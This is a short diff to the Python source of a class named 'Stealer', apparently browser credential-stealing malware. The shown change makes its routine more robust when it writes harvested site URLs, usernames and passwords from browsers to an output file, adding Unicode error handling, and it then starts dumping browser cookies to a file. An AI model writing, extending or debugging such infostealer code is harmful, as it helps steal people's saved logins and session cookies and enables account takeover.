@@ -65,8 +65,14 @@ class Stealer():
 					except:
 						password = ""
 					file.write("URL : " + str(url) + "\n")
-					file.write("Username : " + str(username) + "\n")
-					file.write("Password : " + str(password) + "\n\n")
+					try:
+						file.write("Username : " + str(username) + "\n")
+					except UnicodeEncodeError:
+						file.write("Username : " + username.encode('ascii','ignore') + "\n")
+					try:
+						file.write("Password : " + str(password) + "\n\n")
+					except UnicodeEncodeError:
+						file.write("Password : " + password.encode('ascii','ignore') + "\n")
 			if "Cookies" in result[browser].keys():
 				filename = outdir + "Cookies.txt"
 				file = open(filename,"w")
